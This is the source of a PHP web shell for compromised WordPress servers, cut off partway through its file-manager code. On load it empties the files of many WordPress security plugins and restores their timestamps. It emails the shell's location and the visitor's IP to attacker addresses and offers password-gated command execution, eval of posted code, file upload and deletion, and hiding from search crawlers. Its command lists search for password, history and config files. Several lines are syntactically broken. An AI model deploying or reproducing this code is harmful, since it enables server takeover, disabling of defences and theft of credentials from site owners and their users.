

<?php
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
$d = $_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/';$f = array($d.'wordfence/wordfence.php',$d.'wordfence/waf/bootstrap.php',$d.'better-wp-security/better-wp-security.php',$d.'sucuri-scanner/sucuri.php',$d.'wp-security-audit-log/wp-security-audit-log.php',$d.'total-security/total-security.php',$d.'wp-hide-security-enhancer/wp-hide.php',$d.'bulletproof-security/bulletproof-security.php',$d.'wp-simple-firewall/icwp-wpsf.php',$d.'wp-security-policy/wp-content-security-policy.php',$d.'wp-cerber/wp-cerber.php',$d.'defender-security/wp-defender.php',$d.'security-ninja/security-ninja.php',$d.'cwis-antivirus-malware-detected/cwis-antivirus-malware-detected.php',$d.'ninjafirewall/ninjafirewall.php',$d.'security-antivirus-firewall/index.php',$d.'nfwplus/lib/firewall.php'); foreach ($f as $w) { if (is_file($w) && filesize($w) > 0) { $perms = substr(sprintf("%o", fileperms($w)), -4);$stat = stat($w);if (!is_writable($w)) @chmod($w, 0644);fclose(fopen($w, 'w'));@touch($w, $stat['mtime'], $stat['mtime']);@chmod($w, octdec($perms));clearstatcache();}};global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort,$home_cwd,$cwd,$os,$safe_mode;
$auth_pass = 'e6d037be0f9413ca1751cce755f342ab';
$color = "#ddff55";
$default_use_ajax = true
$default_charset = 'UTF-8';
$default_action='FilesMan';
$default_key = md5($_SERVER['HTTP_USER_AGENT']);
$read = "blackhat1337.id@gmail.com";
$subject = "Checking PHP mail";
$message = "PHP mail works just fine Tuan";
$from= $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].$_SERVER['HTTP_USER_AGENT'];
$headers = "From:" . $from;
$e=base64_decode("bXVocmF6a3lAZ21haWwuY29t");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$tujuanmail = 'papaku.hayker@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail,$e,$read,$subject,$message,$headers, LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	$s = 'haasetcookie';
	$s(md5($_SERVER['HTTP_HOST'])."key", $default_key);
}
if (!function_exists('iconv') && function_exists('libiconv')) {
    function iconv($input_encoding, $output_encoding, $string) {
        return libiconv($input_encoding, $output_encoding, $string);
    }
}
if(empty($_POST['charset']))
	$_POST['charset'] = $default_charset;
if (!isset($_POST['ne'])) {
	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}

function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@clearstatcache();
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@ini_set('disable_functions', 0);
@ini_set('error_log',NULL);
@ini_set('error_logs',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@define('haa_VERSION', '2.5');
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;
if(!function_exists('get_magic_quotes_gpc')){
function get_magic_quotes_gpc() { return false; }
}
if(@get_magic_quotes_gpc()) {
	function haastripslashes($array) {
		return is_array($array) ? array_map('haastripslashes', $array) : stripslashes($array);
	}
	$_POST = haastripslashes($_POST);
    $_COOKIE = haastripslashes($_COOKIE);
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
    function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) {
    function posix_getgrgid($p) {return false;} }
function haaEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function haaViewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function haaPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function haaPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . haaPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . haaPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . haaPerms(@fileperms($f)) . '</font>';
}
function haaScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function haaWhich($p) {
	$path = haaEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"haa_version" => haa_VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
function haasetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionLogout() {
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
	die('bye!');
}
function actionSelfRemove() {
	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        haaHeader();
	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	haaFooter();
}function haaHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . "</title>
<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
	$m = array('Console'=>'Console','FilesMan'=>'FilesMan','Php'=>'Php');;
	if(!empty($GLOBALS['auth_pass']))
		$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if(is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>')
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . haaViewSize($totalSpace) . ' <span>Free:</span> ' . haaViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. haaPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
}function haaFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='green'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	</tr></table></div></body></html>";
} function haaLogin() {
	die("<pre align=center><form method=post><input type=password name=pass><input type=submit value='OK'></form></pre>");
}
if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        haasetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        haaLogin();
} if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
} if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        haasetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        haasetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
	if(isset($_POST['ajax'])) {
		haasetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".haaEx($_POST['p1']),"\n\r\t\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		haasetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	haaHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".haaEx($_POST['p1']));
	}
	echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script>';
	haaFooter();
} function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
				} elseif($_COOKIE['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(@is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_COOKIE['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
